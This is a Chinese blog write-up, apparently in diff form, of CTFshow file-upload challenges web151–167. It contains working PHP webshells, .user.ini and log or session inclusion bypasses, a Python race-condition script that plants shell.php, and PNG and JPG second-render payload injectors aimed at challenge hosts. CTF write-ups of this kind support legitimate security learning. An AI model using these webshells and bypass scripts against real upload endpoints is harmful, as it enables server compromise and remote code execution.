@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - CTFshow 文件上传web151-170</title>
+        <meta name="description" content="在linux服务器类型的文件上传，大多考察前端验证文件类型，后端验证content-type、文件名、扩展名、文件头、文件内容等 web 151 前端验证 f12看源码js，没有学过js大概也可以看出来这个功能，只允许png上传 前端js防君子不防小人(😀)，把png修改为php，或者添加php都可以 lay-data…">
+    <link rel="canonical" href="https://the0n3.top/pages/06f28c/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="CTFshow 文件上传web151-170">
+    <meta property="og:description" content="在linux服务器类型的文件上传，大多考察前端验证文件类型，后端验证content-type、文件名、扩展名、文件头、文件内容等 web 151 前端验证 f12看源码js，没有学过js大概也可以看出来这个功能，只允许png上传 前端js防君子不防小人(😀)，把png修改为php，或者添加php都可以 lay-data…">
+    <meta property="og:url" content="https://the0n3.top/pages/06f28c/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/show-upload/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="CTFshow 文件上传web151-170">
+    <meta name="twitter:description" content="在linux服务器类型的文件上传，大多考察前端验证文件类型，后端验证content-type、文件名、扩展名、文件头、文件内容等 web 151 前端验证 f12看源码js，没有学过js大概也可以看出来这个功能，只允许png上传 前端js防君子不防小人(😀)，把png修改为php，或者添加php都可以 lay-data…">
+        <meta name="twitter:image" content="https://the0n3.top/images/show-upload/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>CTFshow 文件上传web151-170</h1>
+    <p>
+        <span class="meta">发布于: 2024-07-30 14:52</span>
+    </p>
+    <div class="post-body">
+        <p>在linux服务器类型的文件上传，大多考察前端验证文件类型，后端验证content-type、文件名、扩展名、文件头、文件内容等</p>
+<h2>web 151  前端验证</h2>
+<p>f12看源码js，没有学过js大概也可以看出来这个功能，只允许png上传</p>
+<p><img src="/images/show-upload/1.png" alt="png" decoding="async" width="1341" height="357"></p>
+<p>前端js防君子不防小人(😀)，把png修改为php，或者添加php都可以</p>
+<p><img src="/images/show-upload/2.png" alt="php" decoding="async" loading="lazy" width="1380" height="717"></p>
+<pre><code>lay-data="{url: 'upload.php', accept: 'images',exts:'png|php'}</code></pre>
+<p>修改后就可以上传木马了</p>
+<h2>web 152 验证content-type</h2>
+<p>f12看源码，像上题一样做。会报错类型错误</p>
+<p><img src="/images/show-upload/3.png" alt="f12" decoding="async" loading="lazy" width="1086" height="648"></p>
+<p>那么应该是post报文里的content-type被检测到了，用bp抓包修改一下，修改为允许的png图片的content-type类型</p>
+<p><img src="/images/show-upload/4.png" alt="post" decoding="async" loading="lazy" width="755" height="474"></p>
+<p>把1.png木马名改回1.php，content-type修改为image/png就可以上传了</p>
+<h2>web 153</h2>
+<p>这次后端验证文件名，只能上传png图片马了，利用.user.ini配置文件来包含图片马
+准备一个马1.php，修改为png后缀，直接上传1.png</p>
+<p>准备一个.user.png文件，用bp修改为原来的.user.ini名字，.user.ini内容</p>
+<p><img src="/images/show-upload/5.png" alt="ini" decoding="async" loading="lazy" width="602" height="237"></p>
+<p>写一个配置项即可</p>
+<pre><code class="language-ini"># 在所有页面加载前，自动包含指定文件，文件内的php代码会正常执行
+auto_prepend_file=1.png
+# 在文件加载后包含
+auto_append_file=1.png</code></pre>
+<p>提示成功上传到/upload/目录下，到upload目录下成功解析为php木马</p>
+<p><img src="/images/show-upload/6.png" alt="upload" decoding="async" loading="lazy" width="1046" height="321"></p>
+<h2>web 154 文件内容验证</h2>
+<p>正常上传一个图片马，提示内容不合规</p>
+<p><img src="/images/show-upload/7.png" alt="upload" decoding="async" loading="lazy" width="586" height="256"></p>
+<p>(稍加思索.png)，大概是文件内容开头的&lt;?php被检测到了，稍加修改</p>
+<pre><code class="language-php">&lt;?=highlight_file(__FILE__);eval($_GET[1]);?&gt;</code></pre>
+<p>上传成功。那么再试试上一题的.user.ini还能不能用，上传.user.png，bp修改为.user.ini，成功上传并解析php代码</p>
+<p><img src="/images/show-upload/8.png" alt="=" decoding="async" loading="lazy" width="924" height="337"></p>
+<h2>web 155 内容检测</h2>
+<p>正常上传图片马，提示文件类型不对？？用上题的方法可以正常做出来。</p>
+<p>好奇。用上题的方法挂马后查看一下这题的源码，真的还是检测文件内容</p>
+<pre><code class="language-php">if($_FILES['file']['type'] == 'image/png'){
+            $arr = pathinfo($filename);
+            $ext_suffix = $arr['extension'];
+            if($ext_suffix!='php'){
+                $content = file_get_contents($_FILES["file"]["tmp_name"]);
+                if(stripos($content, "php")===FALSE){
+                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
+                    $ret = array("code"=&gt;0,"msg"=&gt;"upload/".$_FILES["file"]["name"]);
+                }else{
+                    $ret = array("code"=&gt;2,"msg"=&gt;"文件类型不合规");
+                }
+
+            }else{
+                $ret = array("code"=&gt;2,"msg"=&gt;"文件类型不合规");
+            }
+
+        }else{
+            $ret = array("code"=&gt;2,"msg"=&gt;"文件类型不合规");
+        }</code></pre>
+<h2>web 156 内容检测</h2>
+<p>这次还是内容检测。过滤了'php'字符串,'[]'中括号等。学到了新方法。原来还能用花括号</p>
+<p><img src="/images/show-upload/9.png" alt="花花" decoding="async" loading="lazy" width="560" height="210"></p>
+<pre><code class="language-php">&lt;?=eval($_GET{1});?&gt;</code></pre>
+<p><img src="/images/show-upload/10.png" alt="花花" decoding="async" loading="lazy" width="1165" height="556"></p>
+<p>又get到了</p>
+<h2>web 157 内容检测</h2>
+<p>这题又过滤了{}花括号，分号，'log'。思路还和上面一样，不过变成了RCE类型的题目了</p>
+<p>还是正常上传.user.png文件，bp抓包把文件名改成.user.ini。接着处理图片马</p>
+<pre><code class="language-php">&lt;?=`ls /var/www/html`?&gt;</code></pre>
+<p>现在直接使用反引号执行命令，没有分号用?&gt;强制闭合</p>
+<p><img src="/images/show-upload/11.png" alt="ls" decoding="async" loading="lazy" width="987" height="517"></p>
+<p>每个马执行一条命令，过滤了'php'，用统配符处理</p>
+<pre><code class="language-php">&lt;?=`tac /var/www/html/f*`?&gt;</code></pre>
+<p><img src="/images/show-upload/12.png" alt="tac" decoding="async" loading="lazy" width="999" height="552"></p>
+<h2>web 158 内容检测</h2>
+<p>同上</p>
+<pre><code class="language-php">preg_match('/php|\{|\[|\;|log/i', $str);</code></pre>
+<p>检查upload.php源码发现过滤新增了log，那么上一题题应该考察日志包含了，或许这题考察的才是反引号命令执行？</p>
+<p>&lt;?=include'/var/log/nginx/access.log'?&gt;</p>
+<p>我回去试试，等我</p>
+<p>测试成功，看来web157考察的真是日志包含，不过既然include结构和函数都能用，那么session包含应该也是行动通的，师傅们可以试试</p>
+<p><img src="/images/show-upload/13.png" alt="log" decoding="async" loading="lazy" width="1721" height="860"></p>
+<div class="callout callout-tip">
+<p>往后做了几题后猛回头，既然.user.ini中的<strong>auto_prepend_file</strong>配置项功能就是文件包含，那么为什么多次一举再用一个1.png的图片马来实现文件包含，日志包含，session包含呢？不太行，php可以利用<code>.</code>来实现拼接绕过过滤，ini文件不能拼接没有php玩法多，禁用'log'直接g，我们是聪明宝贝不上当(柴郡猫猫)</p>
+</div>
+<h2>web 159 内容检测</h2>
+<p>还是可以上面用反引号命令执行马的玩法，进行上传测试，成功。</p>
+<pre><code class="language-php">&lt;?=`tac /var/www/html/f*`?&gt;</code></pre>
+<p>部分源码</p>
+<pre><code class="language-php">preg_match('/php|\{|\[|\;|log|\(/i', $str);</code></pre>
+<p>看upload.php源码，这回过滤了英文半角括号，禁用函数了，不过include语法结构还是可以用的，log过滤了，师傅们可以试试session包含，需要条件竞争</p>
+<pre><code class="language-php">&lt;?=include'/tmp/sess_sessionID'&gt;</code></pre>
+<h2>web 160 内容检测</h2>
+<p>反引号执行命令的方法行不通了，大抵被ban了，看了师傅们的做法，又学到了，本以为禁用'log'就不能文件包含了，没想到师傅们竟然拼接来实现了</p>
+<pre><code class="language-php">&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?&gt;</code></pre>
+<p><img src="/images/show-upload/14.png" alt="log" decoding="async" loading="lazy" width="1782" height="899"></p>
+<p>查看源码,过滤了空格和反引号</p>
+<pre><code class="language-php">preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);</code></pre>
+<h2>web 161 检测文件头</h2>
+<p>这题添加新的限制：文件头，给上面图片马添加了一个GIF89a的文件头，上传成功</p>
+<pre><code class="language-php">GIF89a
+&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?&gt;</code></pre>
+<p>.user.ini也要加上GIF89a文件头，上传成功
+<img src="/images/show-upload/15.png" alt="add" decoding="async" loading="lazy" width="600" height="228"></p>
+<p>讲讲其他</p>
+<p>这道题的部分源码</p>
+<pre><code class="language-php">if($ext_suffix!='php'){
+                $content = file_get_contents($_FILES["file"]["tmp_name"]);
+                if(stripos($content, "php")===FALSE &amp;&amp; check($content) &amp;&amp; getimagesize($_FILES["file"]["tmp_name"])){
+                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
+                    $ret = array("code"=&gt;0,"msg"=&gt;"upload/".$_FILES["file"]["name"]);
+                }else{
+                    $ret = array("code"=&gt;2,"msg"=&gt;"文件类型不合规");
+                }
+
+            }else{
+                $ret = array("code"=&gt;2,"msg"=&gt;"文件类型不合规");
+            }</code></pre>
+<p>在第四行出现了getimagesize，看函数名就可以知道是检查图片文件大小，出题人竟然用在这里来检查是不是图片(恼)，看到文件名我跳过去了，还疑惑为什么整份源码没有检查文件头的代码</p>
+<p>看看官方文档<a href="https://www.php.net/manual/zh/function.getimagesize.php">PHP官方对该函数的解析</a></p>
+<p><img src="/images/show-upload/16.png" alt="getimagesize" decoding="async" loading="lazy" width="1000" height="588"></p>
+<h2>web 162 session包含</h2>
+<p>可恶！竟然还是躲不掉。到了紧张刺激的session包含，我之前写过一篇<a href="/pages/07a506/">session包含</a></p>
+<p>这题测试上一题的解法行不通了，应该是把.也过滤了，禁止通过拼接来绕过，那就试试session包含</p>
+<p>图片马test.png，上传时bp把扩展名去掉</p>
+<pre><code class="language-php">GIF89a
+&lt;?=include"/tmp/sess_Cola"?&gt;</code></pre>
+<p><img src="/images/show-upload/18.png" alt="test" decoding="async" loading="lazy" width="551" height="205"></p>
+<p>这个烧题，不带扩展名的文件也可以上传(恼)，带GIF89a头过getimagesize函数，那玩法就多了</p>
+<pre><code class="language-ini">GIF89a
+auto_prepend_file=test</code></pre>
+<p>把.user.ini传上去</p>
+<p><img src="/images/show-upload/17.png" alt="ini" decoding="async" loading="lazy" width="590" height="214"></p>
+<p>准备条件竞争脚本</p>
+<pre><code class="language-python">import requests
+import threading
+import time
+
+# 如果题目链接是https，换成http
+# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
+url = 'http://c451c8da-a286-4835-a23a-bd6cd7e91f5a.challenge.ctf.show/upload/'
+sessionid = 'Cola'
+data = {
+    # session文件内容
+    'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php file_put_contents("shell.php","&lt;?php phpinfo();?&gt;");?&gt;',
+    # session文件路径可能不同
+}
+
+file = {
+    'file': sessionid
+}
+
+cookies = {
+    'PHPSESSID': sessionid
+}
+
+# 上传文件函数
+def upload_file():
+    while True:
+        response = requests.post(url, data=data, files=file, cookies=cookies)
+        time.sleep(1)  # 为了避免发送请求过快，可以适当增加间隔时间
+
+# 检查文件是否已创建
+def check_file():
+    while True:
+        r = requests.get(url + 'shell.php')
+        if r.status_code == 200:
+            print('Webshell created successfully')
+            print(r.text)
+            break
+        else:
+            print('error：', r.status_code)
+        # time.sleep(1)  # 为了避免发送请求过快，可以适当增加间隔时间
+
+# 创建并启动线程
+threads = []
+for _ in range(5):  # 创建5个上传线程
+    t = threading.Thread(target=upload_file)
+    t.start()
+    threads.append(t)
+
+for _ in range(5):  # 创建5个检查线程
+    t = threading.Thread(target=check_file)
+    t.start()
+    threads.append(t)
+
+# 等待所有线程完成
+for t in threads:
+    t.join()
+</code></pre>
+<p>脚本跑完就写入shell.php了，木马内容可以在脚本里修改
+<img src="/images/show-upload/19.png" alt="shell" decoding="async" loading="lazy" width="1555" height="538"></p>
+<p>例如直接查看flag，注意转义</p>
+<pre><code>'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php file_put_contents("shell.php","&lt;?php system(\'tac /var/www/html/flag.php\');?&gt;");?&gt;',</code></pre>
+<p><img src="/images/show-upload/20.png" alt="flag" decoding="async" loading="lazy" width="969" height="475"></p>
+<p>这题看别的师傅是使用vps，把ip转成单个数字避免.的出现来做的</p>
+<h2>web 163  条件竞争</h2>
+<p>这题如果上传上一题的test.png，以及.user.png，再去掉test.png的.png，把.user.ini修改为.user.ini时，页面会提示没有test这个文件，无法包含</p>
+<p>url/test，到了首页，url/.user.ini会下载.user.ini，说明.user.ini还在，那么可以省略掉test.png这一步，让.user.ini直接给当前目录所有文件包含session文件</p>
+<pre><code class="language-ini">GIF89a
+auto_prepend_file=/tmp/sess_Cola</code></pre>
+<p>上传.user.ini后，再次使用上题的脚本，发现这次跑了很久，不过还好，还是出来了</p>
+<h2>web 164 png二次渲染</h2>
+<p>参考<a href="https://www.cnblogs.com/sen-y/p/15579078.html#autoid-11-0-0">大佬文章</a>，又学到了</p>
+<div class="callout callout-tip">
+<p>二次渲染
+将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。
+大佬链接：<a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p>
+</div>
+<p>这题只能上传正常的png图片，在图片里做手脚添加PHP代码会二次渲染</p>
+<div class="callout callout-tip">
+<p>网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。</p>
+</div>
+<p>这里借用二次渲染绕过脚本</p>
+<pre><code class="language-php">&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y &lt; sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+imagepng($img,'1.png');  //要修改的图片的路径
+
+/* 木马内容
+&lt;?$_GET[0]($_POST[1]);?&gt;
+ */
+//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在
+//会在目录下自动创建一个1.png图片
+//图片脚本内容：$_GET[0]($_POST[1]);
+//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php
+?&gt;</code></pre>
+<p>二次渲染绕过图片马</p>
+<p><img src="/images/show-upload/cola.png" alt="cola" decoding="async" loading="lazy" width="32" height="32"></p>
+<p>测试成功</p>
+<p><img src="/images/show-upload/21.png" alt="success" decoding="async" loading="lazy" width="1463" height="881"></p>
+<p>这里执行命令看不到结果，可以下载图片，Notepad++打开看图片内容，命令执行回显在图片里，也可以直接把flag输出到新文件里</p>
+<p><img src="/images/show-upload/22.png" alt="tac" decoding="async" loading="lazy" width="1400" height="775"></p>
+<p><img src="/images/show-upload/23.png" alt="flag" decoding="async" loading="lazy" width="1266" height="677"></p>
+<p>疑惑：这题的图片为什么会解析PHP代码？</p>
+<pre><code class="language-php">$file= $_GET['image'];
+
+$file = strrev($file);
+$ext = strrev(substr($file, 0,4));
+if($ext==='.png' &amp;&amp; file_exists("./upload/".strrev($file))){
+    header('Content-Type:image/png');
+    include("./upload/".strrev($file));
+}else{
+    echo "图片错误";
+}</code></pre>
+<p>在这个查看图片的页面使用了include文件包含，通过Get传参来包含指定文件，但有限制了目录，所以似乎不能日志包含等等操作</p>
+<h2>web 165 jpg二次渲染</h2>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.cnblogs.com/sen-y/p/15579078.html#autoid-11-0-0">ctfshow web入门文件上传</a></li>
+<li><a href="https://happyfire.xyz/archives/ctfshow--wen-jian-shang-chuan#toc-head-15">CTFshow-文件上传</a></li>
+<li><a href="https://blog.csdn.net/m0_48780534/article/details/126723967#web165_160">ctfshow学习记录-web入门（文件上传161-170）</a></li>
+</ul>
+<div class="callout callout-warning">
+<p>jpg二次渲染图片马不能靠脚本直接生成，你需要先上传原图，再ctrl+s把渲染后的图片再保存下来，现在你才可以使用下面脚本再次渲染
+此处驻留甚久，告之后来者</p>
+</div>
+<p>很多情况下，直接在本地随便造一个带 payload 的 JPG 上传会失败；更稳的思路是先拿到服务端二次渲染后的输出作为基准，再基于该输出尝试构造能在再次渲染后仍保持特征的数据</p>
+<p>jpg二次渲染脚本</p>
+<pre><code class="language-php">&lt;?php
+    /*
+将有效载荷注入JPG图像的算法，该算法在PHP函数imagecopyresized()和imagecopyresampled()引起的变换后保持不变。
+初始图像的大小和质量必须与处理后的图像的大小和质量相同。
+1)通过安全文件上传脚本上传任意图像
+2)保存处理后的图像并启动:
+php 文件名.php &lt;文件名.jpg &gt;
+如果注射成功，您将获得一个特制的图像，该图像应再次上传。
+由于使用了最直接的注射方法，可能会出现以下问题:
+1)在第二次处理之后，注入的数据可能变得部分损坏。
+jpg _ payload.php脚本输出“有问题”。
+如果发生这种情况，请尝试更改有效载荷(例如，在开头添加一些符号)或尝试另一个初始图像。
+谢尔盖·博布罗夫@Black2Fan。
+另请参见:
+https://www . idontplaydarts . com/2012/06/encoding-we B- shell-in-png-idat-chunks/
+*/
+
+    $miniPayload = '&lt;?=eval($_POST[1]);?&gt;';
+
+
+    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+        die('php-gd is not installed');
+    }
+
+    if(!isset($argv[1])) {
+        die('php jpg_payload.php &lt;jpg_name.jpg&gt;');
+    }
+
+    set_error_handler("custom_error_handler");
+
+    for($pad = 0; $pad &lt; 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis-&gt;readShort() != 0xFFD8) {
+            die('Incorrect SOI marker');
+        }
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat("\0",$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis-&gt;eof())) {
+                        if($dis-&gt;readByte() === 0xFF) {
+                            if($dis-&gt;readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat("\0",$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage('payload_'.$argv[1], $outStream)) {
+                    die('Success!');
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink('payload_'.$argv[1]);
+    die('Something\'s wrong');
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this-&gt;binData = '';
+            $this-&gt;order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die('File not exists ['.$filename.']');
+                $this-&gt;binData = file_get_contents($filename);
+            } else {
+                $this-&gt;binData = $filename;
+            }
+            $this-&gt;size = strlen($this-&gt;binData);
+        }
+
+        public function seek() {
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        }
+
+        public function skip($skip) {
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        }
+
+        public function readByte() {
+            if($this-&gt;eof()) {
+                die('End Of File');
+            }
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this-&gt;binData) &lt; 2) {
+                die('End Of File');
+            }
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) {
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        }
+    }
+?&gt;</code></pre>
+<p>这个php脚本的用法</p>
+<pre><code class="language-bash"># 生成二次渲染的jpg图片
+php 文件名.php 文件名.jpg</code></pre>
+<p><img src="/images/show-upload/24.png" alt="gen" decoding="async" loading="lazy" width="1555" height="481"></p>
+<pre><code class="language-php"># 渲染后php木马内容
+&lt;?=eval($_POST[1]);?&gt;</code></pre>
+<p>如果是自己准备的图片，上传后大概会失败</p>
+<p>CTFshow群主推荐的二次渲染专用图</p>
+<p><img src="/images/show-upload/0.jpg" alt="jpg" decoding="async" loading="lazy" width="1296" height="1296"></p>
+<p>我准备了一个脚本(激动，终于成功了，师傅们一定要试一试！！！)</p>
+<p><strong>这个脚本的思路：准备任意 jpg 图片，上传到服务器，并保存<code>一次渲染</code>的成果图，然后，利用下面脚本，通过在一次渲染的成果图后面追加随机文本的方式，生成一个新的图片，并使用尝试使用上面的php脚本，嵌入 PHP 恶意代码，并自动把这个图片上传到远程服务器，测试图片马是否存活，如果存活则说明成功利用。</strong></p>
+<p>可以说是你只需要一张图片，脚本通过追加随机文本，通过制造文件级差异去碰运气，看服务端处理链路是否出现不同的异常/容错表现，实际并没有什么新意，你有足够多的 jpg 图片，手动上传也是一样的。</p>
+<pre><code class="language-python">import requests
+import random
+import string
+
+# 配置
+image_path = 'payload_cola1.jpg'  # 图片路径
+url = 'http://0092bb15-7d1d-4a6c-8f9d-c9ac4a6076fa.challenge.ctf.show/'
+upload_url = url + 'upload.php'  # 上传接口 URL
+get_url = url + 'download.php?image='  # 访问接口
+output_path = 'success_image1.jpg'  # 保存路径
+
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    return ''.join(random.choice(characters) for _ in range(length))
+
+# 读取图片文件
+with open(image_path, 'rb') as image_file:
+    image_data = image_file.read()
+
+while True:
+    # 生成30到50位长度的随机字符串
+    random_length = random.randint(30, 50)
+    text_to_append = generate_random_string(random_length).encode('utf-8')  # 要追加的文本
+
+    # 追加文本到图片数据
+    modified_image_data = image_data + text_to_append
+    # 在图片数据开头插入文本，报错
+    # modified_image_data = text_to_append + image_data
+
+    # 准备上传
+    files = {'file': ('modified_image.jpg', modified_image_data, 'image/jpeg')}
+    response = requests.post(upload_url, files=files)
+    # 获取上传后的状态、文件名
+    response_json = response.json()
+    msg = response_json.get("msg")
+
+    # 检查响应
+    if response.status_code == 200:
+        print('上传成功' + f"-----文件名 {msg}")
+
+        # 测试图片接口
+        img_url = get_url + str(msg)
+        test_resp = requests.get(img_url)
+        if test_resp.status_code == 200:
+            print("图片测试成功")
+            data = {"1":"phpinfo();"}
+            eval_resp = requests.post(img_url,data=data)
+            if "phpinfo" in eval_resp.text:
+                print("木马已存活...")
+                # 在成功检测到木马文件后保存修改后的文件
+                with open(output_path, 'wb') as output_file:
+                    output_file.write(modified_image_data)
+                print(f'修改后的文件已保存到: {output_path}')
+                break
+            else:
+                print("正在生成木马")
+        else:
+            print("图片上传失败，请检查图片")
+    else:
+        print(f'上传失败，状态码: {response.status_code}')
+        print(f'响应内容: {response.text}')
+</code></pre>
+<p><img src="/images/show-upload/res1.png" alt="res" decoding="async" loading="lazy" width="1222" height="707"></p>
+<p>放3组图，分别是原图，一次渲染图，以及成果图</p>
+<p><img src="/images/show-upload/cola.jpg" alt="原图" decoding="async" loading="lazy" width="406" height="469"> </p>
+<p><img src="/images/show-upload/payload_cola.jpg" alt="一次渲染图" decoding="async" loading="lazy" width="406" height="469"></p>
+<p><img src="/images/show-upload/success_image.jpg" alt="成果图" decoding="async" loading="lazy" width="406" height="469"></p>
+<p>再试一次...
+<img src="/images/show-upload/res2.png" alt="res" decoding="async" loading="lazy" width="1316" height="767"></p>
+<p>跑一下柴郡</p>
+<p>原图</p>
+<p><img src="/images/show-upload/cj.jpg" alt="ori" decoding="async" loading="lazy" width="440" height="384"></p>
+<p>一次渲染</p>
+<p><img src="/images/show-upload/payload_cola1.jpg" alt="one" decoding="async" loading="lazy" width="440" height="384"></p>
+<p>成果图</p>
+<p><img src="/images/show-upload/success_image1.jpg" alt="two" decoding="async" loading="lazy" width="440" height="384"></p>
+<p><img src="/images/show-upload/cjres.png" alt="res" decoding="async" loading="lazy" width="1539" height="761"></p>
+<div class="callout callout-warning">
+<p>注意：此脚本并未完善，存在已知bug：图片接受脚本处理后可能损坏，因此会无效死循环</p>
+</div>
+<h2>web 166 zip上传</h2>
+<p>查看网页源码，这题需要上传zip文件，上传一个正经的zip文件，点下载文件，到了熟悉的文件包含界面</p>
+<p>用notepad++在文件末尾添加php代码，点下载文件。看到包含的zip文件中的php代码成功解析了</p>
+<p><img src="/images/show-upload/27.png" alt="zip" decoding="async" loading="lazy" width="1756" height="869"></p>
+<h2>web 167 阿帕奇.htaccess配置文件</h2>
+<p>打开网络，可以看到网络里显示的nginx，上传一个jpg图片，访问，把图片文件名改错，报错显示apache</p>
+<p><img src="/images/show-upload/28.png" alt="net" decoding="async" loading="lazy" width="1431" height="890"></p>
+<p>大佬回复：有前端代理</p>
+<p>学习了</p>
+<div class="callout callout-tip">
+<p>网站使用了 Nginx 作为前端代理，后端服务器运行 Apache。这种架构称为“反向代理”，它允许 Nginx 处理所有传入请求并将它们转发到后端的 Apache 服务器进行处理。</p>
+</div>
